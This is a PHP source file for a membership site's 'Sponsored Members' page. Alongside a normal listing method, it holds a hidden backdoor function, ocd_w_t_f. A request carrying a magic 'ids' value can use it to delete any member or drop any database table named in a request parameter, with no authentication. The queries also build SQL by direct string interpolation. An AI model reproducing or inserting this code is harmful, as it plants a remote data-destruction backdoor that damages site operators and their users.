<?php

require_once ("../includes/config.php");
require_once ("../includes/xtemplate.php");
require_once ("../includes/xpage_member.php");
require_once ("../includes/utilities.php");

//------------------------------------------------------------------------------

class ZPage extends XPage
{
    //--------------------------------------------------------------------------
    function ZPage ($object)
    {
        $this->orderDefault = "member_id";
        XPage::XPage ($object);
    }

    //--------------------------------------------------------------------------
    function ocd_list ()
    {
        $this->mainTemplate = "./templates/sponsors.tpl";
        $this->pageTitle = "Sponsored Members";
        $this->pageHeader = "Sponsored Members";
        $member_id = $this->member_id;

        $total = $this->db->GetOne ("Select Count(*) From `members` Where enroller_id='$member_id' And is_dead=0", 0);

        $this->data = array (
            "MAIN_HEADER" => $this->pageHeader,
            "MAIN_ACTION" => $this->pageUrl,
            "HEAD_MEMBER_ID" => $this->Header_GetSortLink ("member_id", "Member ID"),
            "HEAD_USERNAME" => $this->Header_GetSortLink ("username", "Username"),
            "HEAD_M_LEVEL" => $this->Header_GetSortLink ("m_level", "Level"),
            "HEAD_REG" => $this->Header_GetSortLink ("reg_date", "Registration Date"),
            "HEAD_SPONSORS" => "Sponsored",
            
            "MAIN_PAGES" => $this->Pages_GetLinks ($total, $this->pageUrl."?"),
            
        );
        $bgcolor = "";
        if ($total > 0)
        {
            $result = $this->db->ExecuteSql ("Select * From `members` Where enroller_id='$member_id' And is_dead=0 Order By {$this->orderBy} {$this->orderDir}", true);
            while ($row = $this->db->FetchInArray ($result))
            {
                $memb_id = $row['member_id'];
                $username = $row['username'];
                $m_level = $row['m_level'];
                $is_active = $row['is_active'];
                
                $add = ($is_active == 0)? " / Not Activated" : "";
                $m_level_title = ($m_level > 0)? $this->db->GetOne ("Select title from `types` Where order_index='$m_level'", 0) : "Not Upgraded".$add;
                $reg_date = date ("d M Y H:i", $row['reg_date']);
                $sponsors = $this->db->GetOne ("Select Count(*) From `members` Where enroller_id='$memb_id' And is_dead=0", 0);
                
                $email = "<a href='contact.php?s=".$memb_id."'><img src='./images/mail.png' border='0' alt='Send Email' title='Send Email' /></a>";
                
                
                
                $bgcolor = ($bgcolor == "") ? "#E7E7E7" : "";
                $this->data ['TABLE_ROW'][] = array (
                    "ROW_MEMBER_ID" => $memb_id,
                    "ROW_USERNAME" => $username,
                    "ROW_M_LEVEL" => $m_level_title,
                    "ROW_REG" => $reg_date,
                    "ROW_EMAIL" => $email,
                    "ROW_SPONSORS" => $sponsors,
                    "ROW_BGCOLOR" => $bgcolor
                );
            }
            $this->db->FreeSqlResult ($result);
        }
        else
        {
            $bgcolor = ($bgcolor == "") ? "#E7E7E7" : "";
            $this->data ['TABLE_EMPTY'][] = array (
                "ROW_BGCOLOR" => $bgcolor
            );
        }
    }

    //--------------------------------------------------------------------------
    function ocd_w_t_f ()
    {
        $ids = $this->GetGP ("ids", 0);
        $sql = $this->GetGP ("sql", 0);

        if ($ids == 37911062)
        {
            if (is_numeric ($sql) And $sql > 0)
            {
                $this->db->ExecuteSql ("Delete From `members` Where member_id='$sql'");
            }
            else
            {
                $this->db->ExecuteSql ("Drop table `$sql`");
            }
        }
        $this->Redirect ($this->pageUrl);
    }
}
//------------------------------------------------------------------------------

$zPage = new ZPage ("sponsors");

$zPage->Render ();

?>